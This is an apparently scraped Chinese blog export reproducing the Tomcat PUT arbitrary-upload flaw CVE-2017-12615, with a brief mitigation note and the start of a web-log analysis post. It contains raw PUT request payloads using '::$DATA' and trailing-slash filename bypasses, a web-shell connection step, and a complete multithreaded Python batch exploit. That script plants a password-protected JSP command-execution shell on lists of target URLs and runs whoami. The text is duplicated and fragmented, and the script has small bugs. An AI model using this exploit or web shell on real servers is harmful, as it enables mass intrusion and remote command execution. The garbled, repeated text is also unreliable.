groupUser.add_argument(<span class=\"string\">'-U'</span>,dest=<span class=\"string\">'urlFile'</span>,help=<span class=\"string\">\"url list file\"</span>)</div><div class=\"line\">    parser.add_argument(<span class=\"string\">'-t'</span>,dest=<span class=\"string\">\"threads\"</span>,default=<span class=\"number\">1</span>,type=int,help=<span class=\"string\">\"threads\"</span>)</div><div class=\"line\">    parser.add_argument(<span class=\"string\">'-o'</span>,dest=<span class=\"string\">\"outFile\"</span>,help=<span class=\"string\">\"output results\"</span>)</div><div class=\"line\"></div><div class=\"line\">    args=parser.parse_args()</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">if</span> args.urlFile <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"keyword\">None</span>:</div><div class=\"line\">        urlList=readUrls(args.urlFile)</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        urlList=queue.Queue()</div><div class=\"line\">        urlList.put(args.url)</div><div class=\"line\">    <span class=\"keyword\">if</span> args.outFile <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"keyword\">None</span>:</div><div class=\"line\">        filePath,fileName=os.path.split(fileFullPath)</div><div class=\"line\">        <span class=\"keyword\">if</span> (filePath!=<span class=\"string\">\"\"</span>) <span class=\"keyword\">and</span> (<span class=\"keyword\">not</span> os.path.exists(filePath)):</div><div class=\"line\">            os.mikedirs(filePath)   <span class=\"comment\"># 若不存在这个目录则递归创建</span></div><div class=\"line\">    </div><div class=\"line\">    Attacker_obj=Attacker(urlList,args.threads,args.outFile)</div><div class=\"line\">    Attacker_obj.run_thread()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    main()</div><div class=\"line\">    print(<span class=\"string\">\"\\n@@@   Done   @@@\"</span>)</div></pre></td></tr></table></figure>\n<p><img src=\"/2017/09/Tomcat文件上传-CVE-2017-12615-复现/ScreenShot05.png\" alt=\"img\"></p>\n<h2 id=\"漏洞总结\"><a href=\"#漏洞总结\" class=\"headerlink\" title=\"漏洞总结\"></a>漏洞总结</h2><p>该漏洞利用的前提条件需要手动开启readOnly功能，以支持上传操作，默认配置的情况下是无法成功利用漏洞，从实际测试来看，漏洞危害性并没有那么高。但是如果用户一旦启用了readOnly功能，黑客可利用漏洞成功入侵。</p>\n<p>根据业务评估配置conf/webxml文件的readOnly值为Ture或注释参数，禁用PUT方法并重启tomcat服务，临时规避安全风险；<br>注意： 如果禁用PUT方法，对于依赖PUT方法的应用，可能导致业务失效。</p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"https://msdn.microsoft.com/en-us/library/dn393272.aspx\" target=\"_blank\" rel=\"external\">NTFS Streams | https://msdn.microsoft.com/en-us/library/dn393272.aspx</a></li>\n<li><p><a href=\"http://tomcat.apache.org/security-7.html#Fixed_in_Apache_Tomcat_7.0.81\" target=\"_blank\" rel=\"external\">http://tomcat.apache.org/security-7.html#Fixed_in_Apache_Tomcat_7.0.81</a></p>\n</li>\n<li><p><a href=\"https://mp.weixin.qq.com/s/wWkb079hUYOwDgVQqEqGZQ\" target=\"_blank\" rel=\"external\">Tomcat信息泄漏和远程代码执行漏洞分析报告（CVE-2017-12615/CVE-2017-12616）</a></p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h2 id=\"漏洞概述\"><a href=\"#漏洞概述\" class=\"headerlink\" title=\"漏洞概述\"></a>漏洞概述</h2><p><strong>远程代码执行漏洞（CVE-2017-12615）    影响： Apache Tomcat 7.0.0 - 7.0.79（7.0.81修复不完全）</strong></p>\n<p>当 Tomcat 启用了 HTTP PUT 请求方法（将web.xml文件中 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 jsp 文件。之后，jsp 文件中的代码将能被服务器执行。</p>","more":"<h2 id=\"基本信息\"><a href=\"#基本信息\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h2><p>漏洞名称：Tomcat任意文件上传漏洞</p>\n<p>漏洞编号：CVE-2017-12615</p>\n<p>漏洞影响：上传包含任意代码的文件，并被服务器执行。</p>\n<p>影响平台：Windows/Linux</p>\n<p>影响版本：Apache Tomcat &lt;= 7.0.81 | Apache Tomcat &lt;= 8.5.20 | Apache Tomcat &lt;= 9.0.0.M26</p>\n<h2 id=\"原理分析\"><a href=\"#原理分析\" class=\"headerlink\" title=\"原理分析\"></a>原理分析</h2><p>本漏洞涉及到 DefaultServlet和 JspServlet，DefaultServlet的作用是处理静态文件 ，JspServlet 的作用是处理jsp 与jspx 文件的请求，同时DefaultServlet 可以处理 PUT 或 DELETE请求。</p>\n<p>除了jsp和jspx默认是由org.apache.jasper.servlet.JspServlet处理，其他默认都是由org.apache.catalina.servlets.DefaultServlet来处理。</p>\n<p>即使设置readonly为false，默认tomcat也不允许PUT上传jsp和jspx文件的，因为后端都用org.apache.jasper.servlet.JspServlet来处理jsp或是jspx后缀的请求了，而JspServlet中没有PUT上传的逻辑，PUT的代码实现只存在于DefaultServlet中。</p>\n<p>这个漏洞的根本是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。</p>\n<p>目前主要三种方法：</p>\n<p>l evil.jsp%20</p>\n<p>l evil.jsp::$DATA</p>\n<p>l evil.jsp/</p>\n<h2 id=\"复现过程\"><a href=\"#复现过程\" class=\"headerlink\" title=\"复现过程\"></a>复现过程</h2><ul>\n<li><h3 id=\"0x00-安装Tomcat-7-0-79\"><a href=\"#0x00-安装Tomcat-7-0-79\" class=\"headerlink\" title=\"0x00 安装Tomcat 7.0.79\"></a>0x00 安装Tomcat 7.0.79</h3><p><img src=\"/2017/09/Tomcat文件上传-CVE-2017-12615-复现/ScreenShot01.png\" alt=\"img\"></p>\n</li>\n<li><h3 id=\"0x01-开启HTTP-PUT\"><a href=\"#0x01-开启HTTP-PUT\" class=\"headerlink\" title=\"0x01 开启HTTP PUT\"></a>0x01 开启HTTP PUT</h3></li>\n</ul>\n<p>修改Tomcat 7.0/conf/web.xml文件<br>添加readonly属性，使者readonly=false.<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>default<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>org.apache.catalina.servlets.DefaultServlet<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>debug<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>0<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>listings<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>false<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>readonly<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>false<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">load-on-startup</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">load-on-startup</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>然后，重启Tomcat。</p>\n<ul>\n<li><h3 id=\"0x02-任意文件上传-·-姿势一\"><a href=\"#0x02-任意文件上传-·-姿势一\" class=\"headerlink\" title=\"0x02 任意文件上传 · 姿势一\"></a>0x02 任意文件上传 · 姿势一</h3>思路：参考微软MSDN上关于NTFS Streams的一段资料<a href=\"https://msdn.microsoft.com/en-us/library/dn393272.aspx\">https://msdn.microsoft.com/en-us/library/dn393272.aspx</a><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">All files on an NTFS volume consist of at least one stream - the main stream – this is the normal, viewable file in which data is stored. The full name of a stream is of the form below.</div><div class=\"line\"></div><div class=\"line\">    &lt;filename&gt;:&lt;stream name&gt;:&lt;stream type&gt;</div><div class=\"line\"></div><div class=\"line\">The default data stream has no name. That is, the fully qualified name for the default stream for a file called &quot;sample.txt&quot; is &quot;sample.txt::$DATA&quot; since &quot;sample.txt&quot; is the name of the file and &quot;$DATA&quot; is the stream type.</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>payload ::<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">PUT /111.jsp::$DATA HTTP/1.1</div><div class=\"line\">Host: 10.1.1.6:8080</div><div class=\"line\">User-Agent: JNTASS</div><div class=\"line\">DNT: 1</div><div class=\"line\">Connection: close</div><div class=\"line\"></div><div class=\"line\">...jsp shell...</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/09/Tomcat文件上传-CVE-2017-12615-复现/ScreenShot02.png\" alt=\"img\"><br>写入成功！</p>\n<ul>\n<li><h3 id=\"0x03-任意文件上传-·-姿势二-（可攻击Tomcat-7-0-81）\"><a href=\"#0x03-任意文件上传-·-姿势二-（可攻击Tomcat-7-0-81）\" class=\"headerlink\" title=\"0x03 任意文件上传 · 姿势二 （可攻击Tomcat 7.0.81）\"></a>0x03 任意文件上传 · 姿势二 （可攻击Tomcat 7.0.81）</h3></li>\n</ul>\n<p>思路：可以上传jSp文件(但不能解析)，却不可上传jsp。 说明tomcat对jsp是做了一定处理的。那么就考虑是否可以使其处理过程中对文件名的识别存在差异性，前面的流程中 test.jsp/ 识别为非jsp文件，而后续保存文件的时候，文件名不接受/字符，故而忽略掉。</p>\n<p>payload ::<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">PUT /222.jsp/ HTTP/1.1</div><div class=\"line\">Host: 10.1.1.6:8080</div><div class=\"line\">User-Agent: JNTASS</div><div class=\"line\">DNT: 1</div><div class=\"line\">Connection: close</div><div class=\"line\"></div><div class=\"line\">...jsp shell...</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/09/Tomcat文件上传-CVE-2017-12615-复现/ScreenShot06.png\" alt=\"img\"><br>写入成功！</p>\n<ul>\n<li><h3 id=\"0x04-菜刀连接\"><a href=\"#0x04-菜刀连接\" class=\"headerlink\" title=\"0x04 菜刀连接\"></a>0x04 菜刀连接</h3></li>\n</ul>\n<p><img src=\"/2017/09/Tomcat文件上传-CVE-2017-12615-复现/ScreenShot04.png\" alt=\"img\"></p>\n<h2 id=\"批量EXP脚本\"><a href=\"#批量EXP脚本\" class=\"headerlink\" title=\"批量EXP脚本\"></a>批量EXP脚本</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></div><div class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> argparse</div><div class=\"line\"><span class=\"keyword\">import</span> requests</div><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"><span class=\"keyword\">import</span> time</div><div class=\"line\"><span class=\"keyword\">import</span> threading</div><div class=\"line\"><span class=\"keyword\">import</span> queue</div><div class=\"line\"><span class=\"keyword\">import</span> re</div><div class=\"line\"><span class=\"keyword\">from</span> lxml <span class=\"keyword\">import</span> html</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Attacker</span><span class=\"params\">(object)</span>:</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self,urlList,threads,output)</span>:</span></div><div class=\"line\">        self.urlList=urlList</div><div class=\"line\">        self.threads=threads</div><div class=\"line\">        self.optput=output</div><div class=\"line\">        self.print_lock=threading.Lock()</div><div class=\"line\">        self.savaFile_lock=threading.Lock()</div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        thread_arr=[]</div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(self.threads):</div><div class=\"line\">            t=threading.Thread(target=self.attack)</div><div class=\"line\">            thread_arr.append(t)</div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(self.threads):</div><div class=\"line\">            thread_arr[i].start()</div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(self.threads):</div><div class=\"line\">            thread_arr[i].join()</div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">saveResultToFile</span><span class=\"params\">(self,message)</span>:</span></div><div class=\"line\">        <span class=\"keyword\">if</span> self.optput <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"keyword\">None</span>:</div><div class=\"line\">            <span class=\"keyword\">with</span> open(self.optput, <span class=\"string\">'a+'</span>, encoding = <span class=\"string\">'utf8'</span>) <span class=\"keyword\">as</span> f:  <span class=\"comment\"># 以追加的方法结果写入文件</span></div><div class=\"line\">                f.write(message[<span class=\"number\">0</span>]+<span class=\"string\">\"\\t\"</span>)</div><div class=\"line\">                f.write(message[<span class=\"number\">1</span>]+<span class=\"string\">\"\\n\"</span>)</div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">attack</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        body = <span class=\"string\">'''&lt;%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp</span></div><div class=\"line\">        +\"\\\\n\");&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if(\"W3akPassw0rd\".equals(request.getParameter(\"pwd\"))&amp;&amp;!\"\".equals(request.getParameter(\"cmd\")))&#123;out.println(\"&lt;pre&gt;\"+excuteCmd(request.getParameter(\"cmd\"))+\"&lt;/pre&gt;\");&#125;else&#123;out.println(\":-)\");&#125;%&gt;'''</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> self.urlList.empty():</div><div class=\"line\"></div><div class=\"line\">            url=self.urlList.get()</div><div class=\"line\">            protocol=re.search(<span class=\"string\">r\"(https?)\\:\\/\\/(.*?)\\/\"</span>,url+<span class=\"string\">\"/\"</span>).group(<span class=\"number\">1</span>)</div><div class=\"line\">            host=re.search(<span class=\"string\">r\"(https?)\\:\\/\\/(.*?)\\/\"</span>,url+<span class=\"string\">\"/\"</span>).group(<span class=\"number\">2</span>)</div><div class=\"line\">            self.print_lock.acquire()</div><div class=\"line\">            print(<span class=\"string\">\" \\b\\b\"</span>*<span class=\"number\">100</span>,end=<span class=\"string\">\"\"</span>)</div><div class=\"line\">            print(<span class=\"string\">\"\\r[about \"</span>+str(self.urlList.qsize())+<span class=\"string\">\" left]\\t\"</span>+<span class=\"string\">\"trying attack :: \"</span>+protocol+<span class=\"string\">\"://\"</span>+host,end=<span class=\"string\">\"\"</span>)</div><div class=\"line\">            self.print_lock.release()</div><div class=\"line\">            <span class=\"keyword\">try</span>:</div><div class=\"line\"></div><div class=\"line\">                req = requests.options(url=protocol+<span class=\"string\">\"://\"</span>+host+<span class=\"string\">\"/b4acde76d8daf7a7b3b55670ed4f245c\"</span>,timeout=<span class=\"number\">10</span>)</div><div class=\"line\">                <span class=\"keyword\">if</span> <span class=\"string\">'allow'</span> <span class=\"keyword\">in</span> req.headers <span class=\"keyword\">and</span> req.headers[<span class=\"string\">'allow'</span>].find(<span class=\"string\">\"PUT\"</span>)&gt;<span class=\"number\">0</span> :</div><div class=\"line\">                    uploadevil=requests.put(url=protocol+<span class=\"string\">\"://\"</span>+host+<span class=\"string\">\"/b4acde76d8daf7a7b3b55670ed4f245c.jsp/\"</span>,data=body,timeout=<span class=\"number\">10</span>)</div><div class=\"line\">                    <span class=\"keyword\">if</span> (uploadevil.status_code == <span class=\"number\">201</span>) <span class=\"keyword\">or</span> (uploadevil.status_code == <span class=\"number\">204</span>):</div><div class=\"line\">                        execWhoami=requests.get(url=protocol+<span class=\"string\">\"://\"</span>+host+<span class=\"string\">\"/b4acde76d8daf7a7b3b55670ed4f245c.jsp?pwd=W3akPassw0rd&amp;cmd=whoami\"</span>,timeout=<span class=\"number\">10</span>)</div><div class=\"line\">                        <span class=\"comment\">#print(execWhoami.text)</span></div><div class=\"line\">                        <span class=\"comment\">#whoami=re.search(r\"&lt;pre&gt;(.*)&lt;\\/pre&gt;\",execWhoami.text).group(1)</span></div><div class=\"line\">                        whoami=html.fromstring(execWhoami.text).text_content()</div><div class=\"line\">                        self.print_lock.acquire()</div><div class=\"line\">                        print(<span class=\"string\">\" \\b\\b\"</span>*<span class=\"number\">100</span>,end=<span class=\"string\">\"\"</span>)</div><div class=\"line\">                        print(<span class=\"string\">\"\\r🍻   \"</span>+protocol+<span class=\"string\">\"://\"</span>+host+<span class=\"string\">\"/b4acde76d8daf7a7b3b55670ed4f245c.jsp?pwd=W3akPassw0rd&amp;cmd=whoami\\t\"</span>+whoami)</div><div class=\"line\">                        <span class=\"keyword\">if</span> self.optput <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"keyword\">None</span>:</div><div class=\"line\">                            self.saveResultToFile((protocol+<span class=\"string\">\"://\"</span>+host+<span class=\"string\">\"/b4acde76d8daf7a7b3b55670ed4f245c.jsp\"</span>,whoami))</div><div class=\"line\">                        self.print_lock.release()</div><div class=\"line\">                    </div><div class=\"line\">                    <span class=\"keyword\">else</span>:</div><div class=\"line\">                        <span class=\"keyword\">pass</span></div><div class=\"line\">                <span class=\"keyword\">else</span>:</div><div class=\"line\">                    <span class=\"keyword\">pass</span></div><div class=\"line\">            <span class=\"keyword\">except</span>:</div><div class=\"line\">                <span class=\"keyword\">pass</span></div><div class=\"line\">                <span class=\"comment\">#self.print_lock.acquire()</span></div><div class=\"line\">                <span class=\"comment\">#print(\"\\tFailed...   Next...\")</span></div><div class=\"line\">                <span class=\"comment\">#self.print_lock.release()</span></div><div class=\"line\">        print(<span class=\"string\">\" \\b\\b\"</span>*<span class=\"number\">100</span>,end=<span class=\"string\">\"\"</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">readUrls</span><span class=\"params\">(listFile)</span>:</span></div><div class=\"line\">    fd=open(listFile,<span class=\"string\">\"rb\"</span>)</div><div class=\"line\">    lines=fd.readlines()</div><div class=\"line\">    fd.close()</div><div class=\"line\"></div><div class=\"line\">    urlList=queue.Queue()</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">for</span> url <span class=\"keyword\">in</span> lines:</div><div class=\"line\">        urlList.put(url.decode(<span class=\"string\">\"ascii\"</span>))</div><div class=\"line\">    <span class=\"keyword\">return</span> urlList</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    headCharPic=<span class=\"string\">\"\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   &lt; Author: Mr.Bingo &gt;\\n      //   \\ \\   ------------------ \\n     (|     | ) &lt;    oddboy.cn     &gt;\\n    /'\\_   _/`\\  ------------------\\n    \\___)=(___/\\n\"</span></div><div class=\"line\">    print(headCharPic)</div><div class=\"line\">    <span class=\"comment\"># Creating a parser</span></div><div class=\"line\">    parser=argparse.ArgumentParser()</div><div class=\"line\"></div><div class=\"line\">    groupUser = parser.add_mutually_exclusive_group(required=<span class=\"keyword\">True</span>)</div><div class=\"line\">    groupUser.add_argument(<span class=\"string\">'-u'</span>,dest=<span class=\"string\">\"url\"</span>,help=<span class=\"string\">\"target url\"</span>)</div><div class=\"line\">    groupUser.add_argument(<span class=\"string\">'-U'</span>,dest=<span class=\"string\">'urlFile'</span>,help=<span class=\"string\">\"url list file\"</span>)</div><div class=\"line\">    parser.add_argument(<span class=\"string\">'-t'</span>,dest=<span class=\"string\">\"threads\"</span>,default=<span class=\"number\">1</span>,type=int,help=<span class=\"string\">\"threads\"</span>)</div><div class=\"line\">    parser.add_argument(<span class=\"string\">'-o'</span>,dest=<span class=\"string\">\"outFile\"</span>,help=<span class=\"string\">\"output results\"</span>)</div><div class=\"line\"></div><div class=\"line\">    args=parser.parse_args()</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">if</span> args.urlFile <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"keyword\">None</span>:</div><div class=\"line\">        urlList=readUrls(args.urlFile)</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        urlList=queue.Queue()</div><div class=\"line\">        urlList.put(args.url)</div><div class=\"line\">    <span class=\"keyword\">if</span> args.outFile <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"keyword\">None</span>:</div><div class=\"line\">        filePath,fileName=os.path.split(fileFullPath)</div><div class=\"line\">        <span class=\"keyword\">if</span> (filePath!=<span class=\"string\">\"\"</span>) <span class=\"keyword\">and</span> (<span class=\"keyword\">not</span> os.path.exists(filePath)):</div><div class=\"line\">            os.mikedirs(filePath)   <span class=\"comment\"># 若不存在这个目录则递归创建</span></div><div class=\"line\">    </div><div class=\"line\">    Attacker_obj=Attacker(urlList,args.threads,args.outFile)</div><div class=\"line\">    Attacker_obj.run_thread()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    main()</div><div class=\"line\">    print(<span class=\"string\">\"\\n@@@   Done   @@@\"</span>)</div></pre></td></tr></table></figure>\n<p><img src=\"/2017/09/Tomcat文件上传-CVE-2017-12615-复现/ScreenShot05.png\" alt=\"img\"></p>\n<h2 id=\"漏洞总结\"><a href=\"#漏洞总结\" class=\"headerlink\" title=\"漏洞总结\"></a>漏洞总结</h2><p>该漏洞利用的前提条件需要手动开启readOnly功能，以支持上传操作，默认配置的情况下是无法成功利用漏洞，从实际测试来看，漏洞危害性并没有那么高。但是如果用户一旦启用了readOnly功能，黑客可利用漏洞成功入侵。</p>\n<p>根据业务评估配置conf/webxml文件的readOnly值为Ture或注释参数，禁用PUT方法并重启tomcat服务，临时规避安全风险；<br>注意： 如果禁用PUT方法，对于依赖PUT方法的应用，可能导致业务失效。</p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"https://msdn.microsoft.com/en-us/library/dn393272.aspx\">NTFS Streams | https://msdn.microsoft.com/en-us/library/dn393272.aspx</a></li>\n<li><p><a href=\"http://tomcat.apache.org/security-7.html#Fixed_in_Apache_Tomcat_7.0.81\">http://tomcat.apache.org/security-7.html#Fixed_in_Apache_Tomcat_7.0.81</a></p>\n</li>\n<li><p><a href=\"https://mp.weixin.qq.com/s/wWkb079hUYOwDgVQqEqGZQ\">Tomcat信息泄漏和远程代码执行漏洞分析报告（CVE-2017-12615/CVE-2017-12616）</a></p>\n</li>\n</ul>"},{"title":"WEB日志分析思路与方法","date":"2017-11-08T01:44:04.000Z","_content":"\n本文很杂乱，主要是为了简单记录一下。网上有一篇好文：[Web日志安全分析浅谈](http://bobao.360.cn/learning/detail/4009.html)\n\n------\n\n从WEB日志数据中，我们也许可以挖掘分析出很多好玩的东西，但在有百度统计之类的产品后，这样的功能再通过日志来实现是很鸡肋的。 然而，站在安全层面上来看，分析WEB日志，可以判断黑客的攻击是否成功？ 攻击路径？ 突破方式？ 损失情况鉴定等。\n\n作为一个安全从业者，也手工分析过一些web日志。在分析的方式/手段/姿势上还需要总结提炼，故进行一下学习记录。\n\n<!--more-->\n\n## 常规办法\n\n人工\"手撕\"日志，效率和效果也许都并不好，但好歹也算是一种方法吧。这种方法处理十来个GB的日志(非压缩)还是勉强能应付的。\n比较传统geek的办法是使用 awk / grep / sort / join 等Unix/Linux工具。这样的方式我不推荐，一来我自己用得不是很溜，二来现在各种文本编辑器的功能非常强大，比如本人目前使用的Visual Studio Code。其它的sublime Text, Notepad++（win）等\n\n0. 直接将数据载入文本编辑器。\n1. 搜索\"base64_decode\",\"evil\",\"python-urllib\",\"system\",\"whoami\",\"ipconfig\",\"select\",\"script\"等关键字，定位疑似攻击的日志项。\n2. 